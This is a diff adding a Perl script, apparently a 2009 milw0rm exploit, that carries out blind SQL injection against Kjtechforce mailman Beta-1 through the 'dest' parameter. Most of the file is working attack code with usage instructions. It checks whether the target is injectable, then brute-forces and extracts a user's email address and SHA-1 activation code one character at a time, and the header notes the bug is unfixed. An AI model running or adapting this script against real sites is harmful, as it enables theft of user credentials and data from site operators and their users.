@@ -1,0 +1,254 @@
+#!/usr/bin/perl
+#***********************************************************************************************
+#***********************************************************************************************
+#**	       										      **
+#**  											      **
+#**     [] [] []  [][][][>  []     []  [][  ][]     []   [][]]  []  [>  [][][][>  [][][][]    **
+#**     || || ||  []        [][]   []   []  []     []   []      [] []   []	  []    []    **
+#   [>  [][][][]  [][][][>  [] []  []   []  []   [][]  []       [][]    [][][][>  []    []    **
+#**  [-----[]-----[][][][>--[]--[]-[]---[][][]--[]-[]--[]--------[]-----[][][][>--[][][][]---\ 
+#**==[>    []     []        []   [][]   []  [] [][][]  []       [][]    []           [] []  >>--
+#**  [----[[]]----[]--- ----[]-----[]---[]--[]-----[]--[]-------[] []---[]----------[]--[]---/ 
+#   [>   [[[]]]   [][][][>  [][]   [] [][[] [[]]  [][]  [][][]  []  [>  [][][][> <][]   []    
+#**							                                      **
+#**    											      **
+#**                          ¡VIVA SPAIN!...¡GANAREMOS EL MUNDIAL!...o.O                      **
+#**					  ¡PROUD TO BE SPANISH!	                              **
+#**											      **
+#***********************************************************************************************
+#***********************************************************************************************
+#
+#---------------------------------------------------------------------------------------------
+#|                            ('dest') Blind (SQLi) EXPLOIT	                      	     |
+#|-------------------------------------------------------------------------------------------|
+#|                           |   Kjtechforce mailman Beta-1     |		    	     |
+#|  CMS INFORMATION:          ----------------------------------	               	     |
+#|										             |
+#|-->WEB: http://sourceforge.net/projects/kjtechforce/			          	     |
+#|-->DOWNLOAD: http://sourceforge.net/projects/kjtechforce/		                     |
+#|-->DEMO: N/A										     |
+#|-->CATEGORY: CMS / Mailer								     |
+#|-->DESCRIPTION: The kjtechforce project has aimed at the tool making 		             |
+#|		that supports kjclub.com from the outside...				     |
+#|-->RELEASED: 2009-05-16								     |
+#|											     |
+#|  CMS VULNERABILITY:									     |
+#|											     |
+#|-->TESTED ON: firefox 3						                     |
+#|-->DORK: N/A									             |
+#|-->CATEGORY: BLIND SQL INJECTION EXPLOIT					             |
+#|-->AFFECT VERSION: CURRENT						 		     |
+#|-->Discovered Bug date: 2009-06-02							     |
+#|-->Reported Bug date: 2009-06-02							     |
+#|-->Fixed bug date: Not fixed								     |
+#|-->Info patch: Not fixed							             |
+#|-->Author: YEnH4ckEr									     |
+#|-->mail: y3nh4ck3r[at]gmail[dot]com							     |
+#|-->WEB/BLOG: N/A									     |
+#|-->COMMENT: A mi novia Marijose...hermano,cunyada, padres (y amigos xD) por su apoyo.      |
+#|-->EXTRA-COMMENT: Gracias por aguantarme a todos! (Te kiero xikitiya!)		     |
+#----------------------------------------------------------------------------------------------
+
+#
+#------------
+#CONDITIONS:
+#------------
+#
+#gpc_magic_quotes=OFF
+#
+#
+#---------------------------------------
+#PROOF OF CONCEPT (SQL INJECTION):
+#---------------------------------------
+#
+#http://[HOST]/[PATH]/index.php?id=3&dest=4%27+and+1=1%23 --> TRUE
+#
+#http://[HOST]/[PATH]/index.php?id=3&dest=4%27+and+1=0%23 --> FALSE
+#
+#
+##############################################################################
+##############################################################################
+##**************************************************************************##
+##  SPECIAL THANKS TO: Str0ke and every H4ck3r(all who do milw0rm)!         ##
+##**************************************************************************##
+##--------------------------------------------------------------------------##
+##**************************************************************************##
+## GREETZ TO: JosS, Ulises2k, J.McCray, Evil1 and Spanish Hack3Rs community!##
+##**************************************************************************##
+##############################################################################
+##############################################################################
+#
+#
+use LWP::UserAgent;
+use HTTP::Request;
+#Subroutines
+sub lw
+{
+	my $SO = $^O;
+	my $linux = "";
+	if (index(lc($SO),"win")!=-1){
+		$linux="0";
+	}else{
+		$linux="1";
+	}		
+	if($linux){
+		system("clear");
+	}
+	else{
+		system("cls");
+		system ("title Kjtechforce mailman Beta-1 Blind SQLi Exploit");
+		system ("color 02");
+	}
+}
+sub request {
+	my $userag = LWP::UserAgent->new;
+	$userag -> agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');
+	$request = HTTP::Request -> new(GET => $_[0]);
+	my $outcode= $userag->request($request)->as_string;
+	#print $outcode; #--> Active this line for debugger mode
+	return $outcode;
+}
+sub error {
+print "\t------------------------------------------------------------\n";
+	print "\tWeb isn't vulnerable!\n\n";
+	print "\t--->Maybe:\n\n";
+	print "\t\t1.-Patched.\n";
+	print "\t\t2.-Bad path or host.\n";
+	print "\t\t3.-Magic quotes ON.\n";
+	print "\t\tEXPLOIT FAILED!\n";
+	print "\t------------------------------------------------------------\n";
+}
+sub testedblindsql {
+	print "\t-----------------------------------------------------------------\n";
+	print "\tWEB MAYBE BE VULNERABLE!\n\n";
+	print "\tTested Blind SQL Injection.\n";		
+	print "\tStarting exploit...\n"; 
+	print "\t-----------------------------------------------------------------\n\n";
+}
+
+sub helper {
+	print "\n\t[!!!] Kjtechforce mailman Beta-1 Blind SQLi Exploit\n";
+	print "\t[!!!] USAGE MODE: [!!!]\n";
+	print "\t[!!!] perl $0 [HOST] [PATH] [Target_id]\n";
+	print "\t[!!!] [HOST]: Web.\n";
+	print "\t[!!!] [PATH]: Home Path.\n";
+	print "\t[!!!] [Target_id]: Set Target id\n";
+	print "\t[!!!] Example: perl $0 'www.example.com' 'path' '1'\n";
+}
+sub brute_length{
+#Column length
+$exit=0;
+$i=0;
+while($exit==0){
+	my $blindsql=$_[0]."'+AND+(SELECT+length(address)+FROM+mailman_user+WHERE+id=".$_[1].")=".$i++."%23"; #injected code
+	$output=&request($blindsql);
+	if($output !~ (/is NOT MailMan User./)){
+		$exit=1;
+	}else{
+		$exit=0;
+	}
+	#This is the max length of address or code
+	if($i>40){
+	&error;
+	exit(1);
+	}
+}
+#Save column length
+$length=$i-1;
+print "\t<<<<<--------------------------------------------------------->>>>>\n";
+print "\tLength catched!\n";
+print "\tLength Address --> ".$length."\n";
+print "\tWait several minutes...\n";
+print "\t<<<<<--------------------------------------------------------->>>>>\n\n";
+return $length;
+}
+sub exploiting {
+#Bruteforcing values
+$values="";
+$k=1;
+	$z=45;
+	while(($k<=$_[1]) && ($z<=126)){
+		if($_[2] eq "code"){
+			$blindsql=$_[0]."'+AND+ascii(substring((SELECT+".$_[2]."+FROM+mailman_activator+WHERE+user_id=".$_[3]."),".$k.",1))=".$z."%23";
+		}else{
+			$blindsql=$_[0]."'+AND+ascii(substring((SELECT+".$_[2]."+FROM+mailman_user+WHERE+id=".$_[3]."),".$k.",1))=".$z."%23";
+		}
+		$output=&request($blindsql);
+		if ($output !~ (/is NOT MailMan User./))
+		{
+			$values=$values.chr($z);
+			$k++;
+			$z=45;
+		}
+#new char
+	$z++; 
+	}
+return $values;
+}
+#Main
+&lw;
+print "\t#######################################################\n\n";
+print "\t#######################################################\n\n";
+print "\t##           Kjtechforce mailman Beta-1              ##\n\n";
+print "\t##           Blind SQL Injection Exploit             ##\n\n"; 
+print "\t##       ++Conditions: magic_quotes=OFF              ##\n\n";
+print "\t##               Author: Y3nh4ck3r                   ##\n\n";
+print "\t##      Contact:y3nh4ck3r[at]gmail[dot]com           ##\n\n";
+print "\t##            Proud to be Spanish!                   ##\n\n";
+print "\t#######################################################\n\n";
+print "\t#######################################################\n\n";
+#Init variables
+my $host=$ARGV[0];
+my $path=$ARGV[1];
+$numArgs = $#ARGV + 1;
+if($numArgs<=1) 
+	{
+		&helper;
+		exit(1);	
+	}
+if(!$ARGV[2]){
+	$target_id=1;
+}else{
+	$target_id=$ARGV[2];
+}	
+#Build uri
+my $finalhost="http://".$host."/".$path."/index.php?id=".$target_id."&dest=".$target_id;
+$finalrequest = $finalhost;	
+#Testing blind sql injection
+$testblind1=$finalrequest."'+AND+1=0%23";
+$output1=&request($testblind1);
+$testblind2=$finalrequest."'+AND+1=1%23";
+$output2=&request($testblind2);
+if ($output1 eq $output2)
+{    
+	#Not injectable
+	&error;
+	exit(1); 
+}else{ 
+	#blind sql injection is available
+	&testedblindsql;
+}
+#Bruteforcing length
+$length_address=&brute_length($finalrequest,$target_id);	
+#Bruteforcing username...
+$address=&exploiting($finalrequest,$length_address,'address',$target_id);
+$length_codesha1=40; #Encrypted Sha-1	
+#Bruteforcing password...
+$codesha1=&exploiting($finalrequest,$length_codesha1,'code',$target_id);
+#final checking
+if((!$address) || (!$codesha1)){
+	&error;
+	exit(1);
+}
+print "\n\t\t*************************************************\n";
+print "\t\t*********  EXPLOIT EXECUTED SUCCESSFULLY ********\n";
+print "\t\t*************************************************\n\n";
+print "\t\tEmail address: ".$address."\n";
+print "\t\tSha1 code: ".$codesha1."\n\n";
+print "\n\t\t<<----------------------FINISH!-------------------->>\n\n";
+print "\t\t<<---------------Thanks to: y3hn4ck3r-------------->>\n\n";
+print "\t\t<<------------------------EOF---------------------->>\n\n";
+exit(1);
+#Ok...all job done
+
+# milw0rm.com [2009-06-05]
